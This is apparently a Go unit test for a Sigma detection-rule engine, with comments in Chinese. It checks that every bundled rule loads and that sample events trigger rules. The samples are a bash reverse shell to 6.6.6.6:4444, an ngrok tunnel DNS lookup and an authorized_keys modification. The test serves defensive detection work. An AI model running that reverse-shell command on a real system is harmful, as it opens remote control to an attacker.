package sigma

import "testing"

// 仓库自带的规则必须全部可加载——规则改坏了要在测试里炸，而不是上线后静默跳过。
func TestRepoRulesAllLoad(t *testing.T) {
	engine, report := LoadDirReport("../../../rules")
	if report.Total == 0 {
		t.Fatal("没找到规则目录")
	}
	if report.Loaded != report.Total {
		t.Fatalf("有规则被跳过：%v", report.Skipped)
	}

	// 抽查两条新规则真的能命中
	hits := engine.Evaluate(1007, "linux", map[string]any{
		"process": map[string]any{"cmd_line": "bash -i >& /dev/tcp/6.6.6.6/4444 0>&1"},
	})
	if !containsStr(ruleIDs(hits), "6742a2ee-b09c-4eb9-a040-1be583da8332") {
		t.Errorf("反弹 shell 命令未命中规则：%v", ruleIDs(hits))
	}

	hits = engine.Evaluate(4003, "", map[string]any{
		"query": map[string]any{"hostname": "tcp.ngrok.io"},
	})
	if !containsStr(ruleIDs(hits), "bae25b03-2a0e-44f0-a36d-fe0042b9e66f") {
		t.Errorf("隧道服务 DNS 查询未命中规则：%v", ruleIDs(hits))
	}

	hits = engine.Evaluate(1001, "linux", map[string]any{
		"activity_id": 3,
		"file":        map[string]any{"path": "/root/.ssh/authorized_keys"},
	})
	if !containsStr(ruleIDs(hits), "5a7c1d9e-3b64-4f28-a0d5-8e9f2c4b6a17") {
		t.Errorf("敏感文件变更未命中规则：%v", ruleIDs(hits))
	}
}
